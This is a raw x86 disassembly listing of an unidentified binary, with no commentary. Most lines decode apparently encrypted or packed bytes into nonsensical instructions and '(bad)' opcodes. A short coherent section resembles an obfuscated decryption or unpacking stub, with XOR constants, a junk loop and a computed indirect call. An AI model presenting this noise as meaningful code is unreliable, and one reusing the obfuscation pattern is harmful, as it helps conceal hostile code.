  408ae1:	lods   eax,DWORD PTR ds:[si]
  408ae3:	fstp   DWORD PTR [eax]
  408ae5:	clc    
  408ae6:	gs addr16 dec ecx
  408ae9:	sbb    BYTE PTR es:[edi-0x60],ch
  408aed:	mov    eax,ds:0x8fc84bb5
  408af2:	xor    eax,0x21eeed9d
  408af7:	and    eax,0x1d1e9898
  408afc:	lea    eax,ds:0x3b150f1f
  408b02:	xchg   esi,eax
  408b03:	jbe    0x408b24
  408b05:	xchg   edi,eax
  408b06:	ins    DWORD PTR es:[edi],dx
  408b07:	sub    DWORD PTR [ecx],0xf51a1e73
  408b0d:	jnp    0x408b88
  408b0f:	icebp  
  408b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b11:	xor    DWORD PTR gs:[edi-0x57],ecx
  408b15:	add    esi,0xfe1cad13
  408b1b:	or     eax,0x5db75a37
  408b20:	in     al,dx
  408b21:	adc    DWORD PTR [eax],ebp
  408b23:	mov    edi,0xf8fbc070
  408b28:	jbe    0x408ae1
  408b2a:	mov    esp,0x5a41403a
  408b2f:	aad    0x61
  408b31:	stc    
  408b32:	fistp  DWORD PTR [eax+0xa6a4bea]
  408b38:	mov    ah,0x74
  408b3a:	push   cs
  408b3b:	inc    esi
  408b3c:	dec    ecx
  408b3d:	xchg   ebp,eax
  408b3e:	adc    eax,0xb1c32a02
  408b43:	out    0x98,al
  408b45:	dec    edi
  408b46:	call   0xfc33:0xdf1a8d71
  408b4d:	ins    DWORD PTR es:[edi],dx
  408b4e:	into   
  408b4f:	xlat   BYTE PTR ds:[ebx]
  408b50:	jecxz  0x408b53
  408b52:	daa    
  408b53:	mov    esi,0xb9368f08
  408b58:	stos   BYTE PTR es:[edi],al
  408b59:	add    eax,0xf1f667f1
  408b5e:	mov    bl,0x4f
  408b60:	add    DWORD PTR [eax-0x3d6f3685],esp
  408b66:	hlt    
  408b67:	mov    ebx,0x98a6095f
  408b6c:	dec    ecx
  408b6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b6e:	and    al,0xc3
  408b70:	cmp    ebx,DWORD PTR [ebx-0x3c]
  408b73:	ret    
  408b74:	aam    0x95
  408b76:	mov    bl,0x5e
  408b78:	pushf  
  408b79:	and    edi,DWORD PTR [edi]
  408b7b:	lods   eax,DWORD PTR ds:[esi]
  408b7c:	jmp    0xace7:0xd5192776
  408b83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b84:	push   edx
  408b85:	mov    al,ds:0xa495b488
  408b8a:	ins    BYTE PTR es:[edi],dx
  408b8b:	cmc    
  408b8c:	sub    DWORD PTR [edx+ecx*1-0x455d5496],eax
  408b93:	rol    BYTE PTR [edi-0x11022af9],0xfa
  408b9a:	out    dx,eax
  408b9b:	mov    edx,0x8c2148e0
  408ba0:	mov    ah,0x18
  408ba2:	pop    esp
  408ba3:	aad    0x9e
  408ba5:	call   DWORD PTR [edi-0x75bd4c12]
  408bab:	add    ebx,edx
  408bad:	xor    al,0xe3
  408baf:	shl    dl,0xa2
  408bb2:	ss fwait
  408bb4:	fdivr  QWORD PTR cs:[edi+edx*4-0x6a6835c5]
  408bbc:	sbb    DWORD PTR [ebx-0x450edfa],edx
  408bc2:	xchg   esp,eax
  408bc3:	(bad)  
  408bc4:	clc    
  408bc5:	repnz inc esp
  408bc7:	inc    eax
  408bc8:	lss    esi,FWORD PTR [ebx+0x3d]
  408bcc:	cmc    
  408bcd:	idiv   BYTE PTR [ebx]
  408bcf:	enter  0x9a7,0x60
  408bd3:	sbb    esp,esp
  408bd5:	ja     0x408b75
  408bd7:	ficomp WORD PTR [ebx-0x45]
  408bda:	ficom  WORD PTR [esi+0x75]
  408bdd:	pop    ds
  408bde:	call   0x2973c15
  408be3:	adc    edx,eax
  408be5:	jle    0x408c44
  408be7:	stos   BYTE PTR es:[edi],al
  408be8:	loope  0x408bad
  408bea:	int3   
  408beb:	and    BYTE PTR [ebx],0x28
  408bee:	lods   eax,DWORD PTR ds:[esi]
  408bef:	add    bl,al
  408bf1:	dec    BYTE PTR [eax+0x51]
  408bf4:	loop   0x408b96
  408bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bf7:	sahf   
  408bf8:	sti    
  408bf9:	pop    ds
  408bfa:	jmp    0x48b0:0x4a522773
  408c01:	or     esp,DWORD PTR ds:0xde7d4ef1
  408c07:	ins    DWORD PTR es:[edi],dx
  408c08:	jne    0x408bd6
  408c0a:	mov    cl,0xad
  408c0c:	(bad)
  408c11:	mov    edi,0x1f1a46c9
  408c16:	mov    bh,0x40
  408c18:	mov    ah,0x42
  408c1a:	and    BYTE PTR [ebp-0x2b],cl
  408c1d:	jle    0x408c99
  408c1f:	fld    QWORD PTR [esi-0xb24da52]
  408c25:	push   es
  408c26:	(bad)  
  408c27:	pusha  
  408c28:	jge    0x408c39
  408c2a:	add    DWORD PTR [ebp+eiz*2-0x80],ebx
  408c2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c2f:	pop    es
  408c30:	(bad)  
  408c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c32:	iret   
  408c33:	add    al,0x90
  408c35:	out    0x6c,al
  408c37:	xchg   edi,eax
  408c38:	sub    BYTE PTR [eax+ebx*8],bl
  408c3b:	dec    esi
  408c3c:	pop    esp
  408c3d:	rol    esi,cl
  408c3f:	nop
  408c40:	nop
  408c41:	add    eax,0xdad1cb20
  408c46:	retf   0x1ef4
  408c49:	mul    DWORD PTR ds:0x8f5baa65
  408c4f:	xor    DWORD PTR [ecx+0x21],ecx
  408c52:	inc    ebp
  408c53:	les    ecx,FWORD PTR [ebx+0x18]
  408c56:	mov    edi,0x402902b0
  408c5b:	mov    eax,0x91cad404
  408c60:	imul   ebx,edx,0xffffffec
  408c63:	daa    
  408c64:	mov    dl,0xc4
  408c66:	pop    es
  408c67:	in     eax,0x64
  408c69:	out    dx,al
  408c6a:	sti    
  408c6b:	into   
  408c6c:	jecxz  0x408cdd
  408c6e:	inc    eax
  408c6f:	or     al,0x46
  408c71:	adc    edx,0xffffff9d
  408c74:	call   0xb02f:0xaf4134a3
  408c7b:	loop   0x408c89
  408c7d:	sbb    BYTE PTR [ebx+0xb77eae2],al
  408c83:	jo     0x408c2b
  408c85:	cwde   
  408c86:	mov    ecx,0x121fe1fe
  408c8b:	adc    ebx,DWORD PTR [ebp-0x5625bc99]
  408c91:	ss ret 0xd41c
  408c95:	xchg   DWORD PTR [eax+0x56],eax
  408c98:	dec    ecx
  408c99:	mov    ebp,0x6f12d106
  408c9e:	inc    esp
  408c9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ca0:	dec    ebp
  408ca1:	add    esi,DWORD PTR [edx]
  408ca3:	jb     0x408d04
  408ca5:	iret   
  408ca6:	mov    ah,0x51
  408ca8:	aam    0xd2
  408caa:	pop    es
  408cab:	jbe    0x408c3f
  408cad:	retf   0x8636
  408cb0:	sbb    BYTE PTR [edi],bh
  408cb2:	les    esp,FWORD PTR [edi-0x4d4915ec]
  408cb8:	pop    es
  408cb9:	sub    dl,BYTE PTR [eax+edx*1+0x3c]
  408cbd:	enter  0xd0e,0x17
  408cc1:	enter  0x3714,0x7a
  408cc5:	jecxz  0x408cf6
  408cc7:	scas   eax,DWORD PTR es:[edi]
  408cc8:	xchg   DWORD PTR [ebp+0x16644624],ebx
  408cce:	arpl   WORD PTR [ebx],cx
  408cd0:	jg     0x408cac
  408cd2:	ins    DWORD PTR es:[edi],dx
  408cd3:	sbb    BYTE PTR [eax+edx*2+0x6d],0xd
  408cd8:	outs   dx,DWORD PTR ds:[esi]
  408cd9:	dec    ebx
  408cda:	adc    al,0xb2
  408cdc:	stc    
  408cdd:	pop    esp
  408cde:	mov    edi,0xccaf6b95
  408ce3:	(bad)  
  408ce4:	xor    al,0x22
  408ce6:	test   bl,0x9a
  408ce9:	push   eax
  408cea:	bound  edx,QWORD PTR [ecx]
  408cec:	addr16 adc ecx,edi
  408cef:	jp     0x408cbf
  408cf1:	leave  
  408cf2:	(bad)  
  408cf3:	sbb    eax,0x33dfb843
  408cf8:	loop   0x408d05
  408cfa:	pop    esi
  408cfb:	ja     0x408caa
  408cfd:	push   eax
  408cfe:	xor    cl,dh
  408d00:	add    DWORD PTR [esp+esi*8-0xb],ebp
  408d04:	jne    0x40694b
  408d0a:	mov    eax,esi
  408d0c:	jmp    0x408d16
  408d11:	mov    eax,0x3272db
  408d16:	mov    ebx,0x7510893
  408d1b:	mov    ecx,DWORD PTR [ebp-0x4]
  408d1e:	xor    ecx,ebx
  408d20:	add    ecx,eax
  408d22:	mov    DWORD PTR [ebp-0xc],ecx
  408d25:	mov    ebx,0x65655
  408d2a:	add    ebx,0x3234
  408d30:	xchg   ebx,esi
  408d32:	xor    ebx,ebx
  408d34:	push   esi
  408d35:	mov    esi,ebx
  408d37:	pop    ebx
  408d38:	mov    edx,esi
  408d3a:	add    ebx,0x1002
  408d40:	lea    eax,[ebp-0x10]
  408d43:	add    edx,eax
  408d45:	add    edx,0x5
  408d48:	push   edx
  408d49:	inc    esi
  408d4a:	pop    ecx
  408d4b:	dec    ecx
  408d4c:	xchg   ecx,eax
  408d4d:	dec    eax
  408d4e:	xchg   ecx,eax
  408d4f:	dec    ecx
  408d50:	xchg   ecx,edx
  408d52:	dec    edx
  408d53:	push   edx
  408d54:	mov    edx,ebx
  408d56:	pop    ebx
  408d57:	dec    ebx
  408d58:	call   DWORD PTR [ebx]
  408d5a:	cmp    DWORD PTR [ebp+0x10],esi
  408d5d:	je     0x408d7c
  408d63:	xchg   edx,eax
  408d64:	push   0xb
  408d66:	pop    ecx
  408d67:	push   0x4
  408d69:	pop    ebx
  408d6a:	inc    ebx
  408d6b:	xchg   ebx,ecx
  408d6d:	sub    ebx,ecx
  408d6f:	xchg   ebx,ecx
  408d71:	dec    ecx
  408d72:	dec    ecx
  408d73:	mov    eax,DWORD PTR [ebp-0x1c]
  408d76:	imul   eax,ecx
  408d79:	add    esp,eax
  408d7b:	xchg   edx,eax
  408d7c:	push   eax
  408d7d:	xor    ebx,ebx
  408d7f:	mov    edx,esp
  408d81:	dec    edx
  408d82:	inc    ebx
  408d83:	add    ebx,DWORD PTR [edx+ebx*1]
  408d86:	dec    ebx
  408d87:	xor    edx,edx
  408d89:	add    DWORD PTR [ebp-0xc],ebx
  408d8c:	pop    ebx
  408d8d:	mov    eax,DWORD PTR [ebp-0xc]
  408d90:	pop    edi
  408d91:	pop    esi
  408d92:	pop    ebx
  408d93:	leave  
  408d94:	ret    0x10
  408d97:	push   ebp
  408d98:	mov    ebp,esp
  408d9a:	push   ecx
  408d9b:	xor    ecx,ecx
  408d9d:	xor    ecx,DWORD PTR ds:0x42600c
  408da3:	and    DWORD PTR ds:0x426014,ecx
  408da9:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  408db0:	mov    eax,DWORD PTR [ebp-0x4]
  408db3:	sub    edx,edx
  408db5:	mov    edx,DWORD PTR [ebp+0x10]
  408db8:	and    DWORD PTR ds:0x427014,ebx
  408dbe:	mov    ecx,0x7510893
  408dc3:	xor    eax,ecx
  408dc5:	add    eax,0x3272db
  408dca:	mov    DWORD PTR [edx],eax
  408dcc:	mov    DWORD PTR ds:0x426008,0x4f8c
  408dd6:	mov    eax,DWORD PTR [ebp+0xc]
  408dd9:	sbb    DWORD PTR ds:0x425020,0x2880
  408de3:	xor    eax,ecx
  408de5:	and    DWORD PTR ds:0x429008,0x0
  408def:	mov    edx,DWORD PTR ds:0x429008
  408df5:	inc    edx
  408df6:	mov    DWORD PTR ds:0x429008,edx
  408dfc:	cmp    DWORD PTR ds:0x429008,0x17
  408e03:	jne    0x408e19
  408e09:	push   0x41ffb1
  408e0e:	push   0x391b
  408e13:	call   DWORD PTR ds:0x421008
  408e19:	cmp    DWORD PTR ds:0x429008,0x15
  408e20:	jb     0x408def
  408e26:	xor    DWORD PTR ds:0x42700c,edi
  408e2c:	push   esi
  408e2d:	mov    esi,DWORD PTR [ebp+0x10]
  408e30:	mov    edx,0x3272db
  408e35:	add    eax,edx
  408e37:	mov    DWORD PTR [esi+0x4],eax
  408e3a:	mov    eax,DWORD PTR [ebp+0x14]
  408e3d:	mov    esi,DWORD PTR [ebp+0x10]
  408e40:	mov    DWORD PTR [esi+0x8],eax
  408e43:	jmp    0x40b197
  408e48:	push   ebp
  408e49:	add    al,0x4c
  408e4b:	mov    al,ds:0x6365b8eb
  408e50:	add    eax,0xc23327cf
  408e55:	call   0x19cb38e6
  408e5a:	bound  esp,QWORD PTR [edx+0x2b]
  408e5d:	pop    edi
  408e5e:	bound  esp,QWORD PTR [edx+0x7b]
  408e61:	jae    0x408e1e
  408e63:	sub    BYTE PTR [edx+0x195a65e3],bl
  408e69:	loopne 0x408e21
  408e6b:	xor    bl,dh
  408e6d:	sub    eax,DWORD PTR [edx+0x62]
  408e70:	dec    esi
  408e71:	(bad)  
  408e72:	mov    eax,ds:0x8802e4d3
  408e77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e78:	loop   0x408eb9
  408e7a:	arpl   WORD PTR [ebx-0x3bc41d0d],bp
  408e80:	ins    BYTE PTR es:[edi],dx
  408e81:	mov    DWORD PTR [ebx-0x4e83d067],edi
  408e87:	adc    DWORD PTR [edi],esi
  408e89:	lock scas al,BYTE PTR es:[edi]
  408e8b:	adc    BYTE PTR [ebx+0x11],ch
  408e8e:	hlt    
  408e8f:	repz xor DWORD PTR ds:0x20f61f7a,eax
  408e96:	jbe    0x408e73
  408e98:	das    
  408e99:	scas   eax,DWORD PTR es:[edi]
  408e9a:	dec    BYTE PTR [ebx-0x7df89c13]
  408ea0:	adc    DWORD PTR [edx+0x6c6139ee],0xffffffd7
  408ea7:	out    0x3a,al
  408ea9:	jne    0xf288fd11
  408eaf:	mov    ch,0xb3
  408eb1:	and    BYTE PTR [esp+eiz*4],0x47
  408eb5:	mov    dl,dh
  408eb7:	mov    cl,dl
  408eb9:	dec    edx
  408eba:	dec    esp
  408ebb:	or     eax,0x2b37b3b0
  408ec0:	gs mov ebx,0x7288537e
  408ec6:	jmp    0xf9a1:0x4af6b5c6
  408ecd:	fcom   QWORD PTR [edi]
  408ecf:	and    eax,0xfcbac3e8
  408ed4:	jno    0x408ecc
  408ed6:	pusha  
  408ed7:	enter  0xcd2c,0x30
  408edb:	jmp    0x408f09
  408edd:	push   cs
  408ede:	and    BYTE PTR [esi-0x68],bh
  408ee1:	(bad)  
  408ee2:	xlat   BYTE PTR ds:[ebx]
  408ee3:	jecxz  0x408eac
  408ee5:	mov    eax,edi
  408ee7:	int    0xff
  408ee9:	les    eax,FWORD PTR [edi]
  408eeb:	cld    
  408eec:	dec    eax
  408eed:	push   es
  408eee:	pop    edx
  408eef:	ss dec esi
  408ef1:	inc    eax
  408ef2:	jp     0x408eb7
  408ef4:	mov    esp,edx
  408ef6:	aam    0x50
  408ef8:	hlt    
  408ef9:	inc    esp
  408efa:	xlat   BYTE PTR ds:[ebx]
  408efb:	push   edx
  408efc:	fcom   QWORD PTR [esp+edx*4+0x3]
  408f00:	rol    DWORD PTR [ebp+eiz*4+0x65],0x32
  408f05:	mov    edx,es
  408f07:	fadd   QWORD PTR [ecx-0x6f5831db]
  408f0d:	int3   
  408f0e:	fstp   DWORD PTR [edx+0x2d]
  408f11:	fdiv   QWORD PTR es:[ecx+0x316c990a]
  408f18:	xor    eax,0x8173f21e
  408f1d:	rcl    BYTE PTR [esi+ebx*4+0x55],cl
  408f21:	mov    ebp,0xac1f7829
  408f26:	or     al,0x45
  408f28:	popf   
  408f29:	adc    DWORD PTR [ecx],eax
  408f2b:	and    eax,0xd4d3607f
  408f30:	sbb    al,0x71
  408f32:	sar    BYTE PTR [ebp-0x84615ff],0x5b
  408f39:	sub    edi,DWORD PTR [edi+0x4b]
  408f3c:	add    DWORD PTR [ecx],0xffffffdb
  408f3f:	in     al,0xa3
  408f41:	cs cld 
  408f43:	aaa    
  408f44:	clc    
  408f45:	sbb    al,0xd1
  408f47:	sub    eax,0xbe5cc461
  408f4c:	fdivr  QWORD PTR [edi-0x13]
  408f4f:	or     bl,BYTE PTR [ebp+0x6c9915a4]
  408f55:	and    al,0x49
  408f57:	pop    edx
  408f58:	add    BYTE PTR [edx-0x69713695],al
  408f5e:	xchg   esi,ecx
  408f60:	rcl    DWORD PTR [eax],0x16
  408f63:	call   0xfa12e859
  408f68:	inc    edi
  408f69:	xor    eax,0x3c021eb8
  408f6e:	and    ecx,ebx
  408f70:	cmc    
  408f71:	arpl   WORD PTR [edx+0x39],dx
  408f74:	aas    
  408f75:	rol    BYTE PTR [ebx+0x8087b28],1
  408f7b:	pop    eax
  408f7c:	push   ebp
  408f7d:	sbb    ebp,DWORD PTR ds:0x91f64837
  408f83:	pop    ss
  408f84:	sbb    BYTE PTR [ebx+0x276c651b],dl
  408f8a:	retf   
  408f8b:	sahf   
  408f8c:	aad    0x7f
  408f8e:	sbb    DWORD PTR [eax+0x26],0xda7882e8
  408f95:	add    DWORD PTR [ebx+0x76],esi
  408f98:	jecxz  0x408fbe
  408f9a:	aaa    
  408f9b:	leave  
  408f9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f9d:	test   eax,0xa6da17a
  408fa2:	shl    BYTE PTR [esi],cl
  408fa4:	shr    bl,cl
  408fa6:	lea    edi,[ecx-0x53d1e117]
  408fac:	popf   
  408fad:	mov    dl,0x1c
  408faf:	retf   
  408fb0:	(bad)  
  408fb1:	xchg   ecx,eax
  408fb2:	fst    DWORD PTR ds:0x4e55e59f
  408fb8:	js     0x408fe5
  408fba:	dec    eax
  408fbb:	xor    eax,0x7cb2fce5
  408fc0:	xchg   esp,ecx
  408fc2:	add    bh,BYTE PTR [eax+ecx*2-0x79]
  408fc6:	and    esp,DWORD PTR [edx-0x21b7d488]
  408fcc:	mov    eax,ds:0xa41afe29
  408fd1:	mov    WORD PTR [edx],ds
  408fd3:	addr16 test bl,cl
  408fd6:	sbb    DWORD PTR ds:0xcee72cc5,0x57
  408fdd:	or     DWORD PTR [ebx+0x30bf21a6],0xf56a61b4
  408fe7:	dec    edi
  408fe8:	or     al,0xf3
  408fea:	scas   al,BYTE PTR es:[edi]
  408feb:	rcl    ah,cl
  408fed:	clc    
  408fee:	lds    esi,FWORD PTR [ebp-0x574966b5]
  408ff4:	(bad)  
  408ff5:	aaa    
  408ff6:	daa    
  408ff7:	sbb    eax,0x3f484d76
  408ffc:	fsubrp st(0),st
  408ffe:	pop    esi
  408fff:	pop    ebx
  409000:	ret    0xd34f
  409003:	adc    eax,0xe40c8f09
  409008:	push   0xdfd3acf3
  40900d:	adc    ebx,DWORD PTR [ecx-0x13726c60]
  409013:	retf   
  409014:	jge    0x409083
  409016:	fwait
  409017:	push   ebx
  409018:	(bad)  [ecx+0x2e487c7b]
  40901e:	ss cmp eax,0xc0b51610
  409024:	scas   eax,DWORD PTR es:[edi]
  409025:	aas    
  409026:	pop    edx
  409027:	out    0x8d,al
  409029:	push   edx
  40902a:	cdq    
  40902b:	in     eax,dx
  40902c:	xchg   ecx,esp
  40902e:	fstp   st(2)
  409030:	(bad)
  409034:	int3   
  409035:	or     esp,ebx
  409037:	add    esi,DWORD PTR [ebx+0x69e440ac]
  40903d:	(bad)  
  40903e:	or     eax,0xe2202992
  409043:	neg    BYTE PTR ds:0x2947ef69
  409049:	retf   
  40904a:	adc    DWORD PTR [ebp+edx*4-0x2072606a],ebx
  409051:	pusha  
  409052:	ins    BYTE PTR es:[edi],dx
  409053:	xor    edx,0xffffffa2
  409056:	ror    BYTE PTR [edx+edi*8-0x64],1
  40905a:	mov    ebx,0xc6b5b90d
  40905f:	and    BYTE PTR [edi-0x62],bl
  409062:	int3   
  409063:	dec    esp
  409064:	push   0xffffff81
  409066:	iret   
  409067:	inc    esp
  409068:	daa    
  409069:	push   cs
  40906a:	cmp    DWORD PTR [esi],ebp
  40906c:	sub    BYTE PTR [ecx+0x1bdb98db],dh
  409072:	fisttp QWORD PTR [ebp-0x73]
  409075:	cmp    BYTE PTR [edx+0x34],dh
  409078:	mov    edx,0xa9d2e460
  40907d:	scas   eax,DWORD PTR es:[edi]
  40907e:	mov    eax,ss:0x4ae7ef32
  409084:	icebp  
  409085:	mov    ebp,0x7702844f
  40908a:	or     ch,BYTE PTR [esp+eax*4]
  40908d:	pop    ss
  40908e:	fidiv  DWORD PTR [ebx]
  409090:	fs out 0x7e,eax
  409093:	lea    ebp,ds:0xd5a17085
  409099:	lahf   
  40909a:	sti    
  40909b:	sbb    al,0x27
  40909d:	fisttp WORD PTR [esi+0x3f0df5b5]
  4090a3:	push   ebx
  4090a4:	jp     0x4090fb
  4090a6:	or     al,0x65
  4090a8:	inc    esi
  4090a9:	adc    BYTE PTR [edx-0x21],ah
  4090ac:	icebp  
  4090ad:	mov    esi,0x95005656
  4090b2:	aad    0x2e
  4090b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090b5:	pop    eax
  4090b6:	fnstenv [edx]
  4090b8:	mov    ebp,0x20d39b6c
  4090bd:	xor    al,0xca
  4090bf:	imul   ebx,esp,0xfa0d5afc
  4090c5:	mov    ebx,0xaecec4ba
  4090ca:	retf   0x9adc
  4090cd:	inc    ebp
  4090ce:	aas    
  4090cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090d0:	call   DWORD PTR [esi+eiz*4+0x2]
  4090d4:	dec    ebp
  4090d5:	dec    edx
  4090d6:	outs   dx,BYTE PTR ds:[esi]
  4090d7:	ja     0x4090db
  4090d9:	mov    ebx,DWORD PTR [ecx+ebp*4]
  4090dc:	iret   
  4090dd:	loopne 0x4090e1
  4090df:	lods   eax,DWORD PTR ds:[esi]
  4090e0:	push   0x91497a36
  4090e5:	es adc ah,ah
  4090e8:	cmp    edi,DWORD PTR [esi+0x46]
  4090eb:	mov    cl,0x7d
  4090ed:	push   esi
  4090ee:	sahf   
  4090ef:	pop    ebp
  4090f0:	(bad)  
  4090f1:	sahf   
  4090f2:	int    0x23
  4090f4:	jge    0x4090ba
  4090f6:	sub    ah,BYTE PTR [ebp-0x6f]
  4090f9:	inc    ebx
  4090fa:	push   0xffffffbd
  4090fc:	mov    cl,bl
  4090fe:	pop    ebp
  4090ff:	mov    bl,0xbf
  409101:	push   0x3222b0ac
  409106:	mov    bl,0x1f
  409108:	dec    ebx
  409109:	fadd   QWORD PTR [ebx-0x55]
  40910c:	fiadd  DWORD PTR [eax]
  40910e:	sub    cl,BYTE PTR [esi-0x47]
  409111:	cmp    eax,0x4582fe6b
  409116:	jecxz  0x409189
  409118:	inc    edi
  409119:	dec    eax
  40911a:	sub    eax,0x5b5c257e
  40911f:	xchg   DWORD PTR [ebp-0x211acf7d],ebp
  409125:	shl    cl,cl
  409127:	dec    ecx
  409128:	add    esi,DWORD PTR [ecx-0x6d]
  40912b:	lahf   
  40912c:	push   esi
  40912d:	jb     0x409156
  40912f:	sbb    bl,dl
  409131:	out    0x4d,al
  409133:	sub    eax,0x85f37ce4
  409138:	lods   eax,DWORD PTR ds:[esi]
  409139:	arpl   di,bx
  40913b:	mov    ds:0xcfbb5ae5,al
  409140:	push   ecx
  409141:	mov    ah,0xea
  409143:	xchg   ecx,eax
  409144:	add    BYTE PTR [ecx+0x7407a449],dl
  40914a:	mov    eax,DWORD PTR [ebp-0x2a7a254d]
  409150:	xchg   edx,eax
  409151:	daa    
  409152:	outs   dx,DWORD PTR ds:[esi]
  409153:	hlt    
  409154:	push   ds
  409155:	call   0xc7f02122
  40915a:	pop    esp
  40915b:	pop    es
  40915c:	jnp    0x409175
  40915e:	js     0x4091d0
  409160:	ds push 0xd96b233f
  409166:	sbb    ebp,DWORD PTR [esi-0x7d]
  409169:	out    dx,al
  40916a:	mov    BYTE PTR [esi-0x5ad24f6b],0x69
  409171:	push   ebx
  409172:	pusha  
  409173:	xor    bh,ah
  409175:	xchg   edi,edx
  409177:	adc    BYTE PTR [esi],cl
  409179:	jb     0x40912b
  40917b:	aam    0xa4
  40917d:	(bad)
  409180:	stos   DWORD PTR es:[edi],eax
  409181:	mov    ch,0xd6
  409183:	stos   BYTE PTR es:[edi],al
  409184:	adc    ah,al
  409186:	mov    ebp,eax
  409188:	iret   
  409189:	nop
  40918a:	jle    0x4091a4
  40918c:	inc    edx
  40918d:	leave  
  40918e:	mov    ebx,0xd73d2ee3
  409193:	pusha  
  409194:	mov    WORD PTR [ecx+ebx*4],es
  409197:	add    al,0x33
  409199:	mov    bh,BYTE PTR [edi]
  40919b:	ins    BYTE PTR es:[edi],dx
  40919c:	jl     0x4091e4
  40919e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40919f:	dec    edi
  4091a0:	and    DWORD PTR [eax+0x31],esp
  4091a3:	pop    eax
  4091a4:	es test al,0x40
  4091a7:	or     DWORD PTR [ebx],0x42
  4091aa:	test   DWORD PTR [edi-0x74780f13],esi
  4091b0:	push   esp
  4091b1:	xor    ch,cl
  4091b3:	dec    ebp
  4091b4:	push   ds
  4091b5:	fsubrp st(2),st
  4091b7:	mov    esi,0xa9ce5059
  4091bc:	and    al,0xe6
  4091be:	push   ds
  4091bf:	mov    dl,0x31
  4091c1:	outs   dx,DWORD PTR ds:[esi]
  4091c2:	inc    edi
  4091c3:	adc    BYTE PTR [ebx+0x43],0x8d
  4091c7:	cmp    eax,0x1a5e52f9
  4091cc:	sbb    ch,bh
  4091ce:	jge    0x40919c
  4091d0:	sahf   
  4091d1:	jg     0x40918e
  4091d3:	mov    dl,0x22
  4091d5:	cmp    BYTE PTR [edx],cl
  4091d7:	aad    0x37
  4091d9:	aam    0xab
  4091db:	xchg   esi,eax
  4091dc:	pop    ss
  4091dd:	jns    0x409220
  4091df:	imul   ebp,DWORD PTR [edx-0xb46b0e3],0xffffffc1
  4091e6:	and    al,0x39
  4091e8:	(bad)  
  4091ea:	les    ebx,FWORD PTR [ecx+edi*4-0x7ff4d151]
  4091f1:	xchg   edx,eax
  4091f2:	sub    BYTE PTR [ebx-0x74],ch
  4091f5:	in     eax,0xd
  4091f7:	inc    eax
  4091f8:	mov    gs,ecx
  4091fa:	xor    edx,DWORD PTR [edi-0x66962ee1]
  409200:	inc    eax
  409201:	add    al,0xea
  409203:	(bad)  
  409204:	or     BYTE PTR [edi-0x23],al
  409207:	mov    ebp,0xe8de293b
  40920c:	loop   0x40922f
  40920e:	push   ecx
  40920f:	mov    ecx,0xee245aa8
  409214:	jp     0x4091cd
  409216:	cli    
  409217:	fcmovne st,st(3)
  409219:	frstor [esi+0x5bee85e2]
  40921f:	pop    es
  409220:	sbb    eax,0xd4c69493
  409225:	test   eax,0x9d521ade
  40922a:	adc    al,BYTE PTR [edi-0x44cef1d4]
  409230:	mov    ebx,0x8da38af6
  409235:	push   esi
  409236:	adc    al,0xd8
  409238:	mov    al,bl
  40923a:	mov    ch,0x88
  40923c:	jg     0x40924b
  40923e:	mov    bh,0x41
  409240:	jmp    0x4091e8
  409242:	cld    
  409243:	push   ecx
  409244:	mov    BYTE PTR [ebp+0x62],bl
  409247:	pop    ebx
  409248:	repnz xchg ebx,eax
  40924a:	inc    ecx
  40924b:	sar    BYTE PTR ds:0x382ffde3,cl
  409251:	mov    ds:0xa95f9aa9,al
  409256:	mov    edx,0x25099a5b
  40925b:	rcr    BYTE PTR [ecx],cl
  40925d:	mov    esp,0x3c61967d
  409262:	cli    
  409263:	dec    ecx
  409264:	push   edi
  409265:	xor    eax,0x3cf71022
  40926a:	bound  eax,QWORD PTR [bx]
  40926d:	pop    eax
  40926e:	test   eax,0x43b152ac
  409273:	pop    ss
  409274:	fwait
  409275:	idiv   ah
  409277:	inc    edx
  409278:	test   DWORD PTR [ebx],0x2713c237
  40927e:	push   ecx
  40927f:	sbb    bl,BYTE PTR [edi-0x42]
  409282:	dec    ebp
  409283:	and    ebx,esi
  409285:	addr16 jb 0x4092a6
  409288:	dec    ecx
  409289:	push   cs
  40928a:	and    ecx,DWORD PTR ss:[edx-0x98d81c2]
  409291:	jl     0x4092fb
  409293:	push   esp
  409294:	xchg   ah,ch
  409296:	mov    ds:0xf88bfb34,al
  40929b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40929c:	mov    al,0x48
  40929e:	loopne 0x40929b
  4092a0:	mov    eax,0xfa421101
  4092a5:	mov    dh,0xbc
  4092a7:	push   ebp
  4092a8:	mov    ebx,0x25ef7ca1
  4092ad:	ins    DWORD PTR es:[edi],dx
  4092ae:	and    BYTE PTR [ecx-0x6dca34b2],bh
  4092b4:	shr    cx,cl
  4092b7:	xor    al,0xe9
  4092b9:	popf   
  4092ba:	inc    ebp
  4092bb:	jmp    0x409294
  4092bd:	iret   
  4092be:	retf   
  4092bf:	loopne 0x40926a
  4092c1:	or     DWORD PTR [ecx+edi*2+0x4a5a172b],edi
  4092c8:	push   ebp
  4092c9:	adc    BYTE PTR [ecx-0x238a0be5],al
  4092cf:	out    0xb,al
  4092d1:	lods   eax,DWORD PTR ds:[esi]
  4092d2:	xor    eax,0x8847375c
  4092d7:	enter  0xa0ae,0x93
  4092db:	dec    edx
  4092dc:	(bad)  
  4092dd:	dec    ebp
  4092de:	movsx  eax,BYTE PTR [edx+0x9]
  4092e2:	mov    edx,0x891d4f47
  4092e7:	mov    cl,0xda
  4092e9:	pop    edx
  4092ea:	jns    0x409285
  4092ec:	and    esp,DWORD PTR [ecx-0x66]
  4092ef:	ja     0x4092a2
  4092f1:	lods   eax,DWORD PTR ds:[esi]
  4092f2:	out    0x6b,eax
  4092f4:	mov    dh,0x9a
  4092f6:	xchg   esp,eax
  4092f7:	sub    dh,BYTE PTR [ebp+esi*2-0xa2caf80]
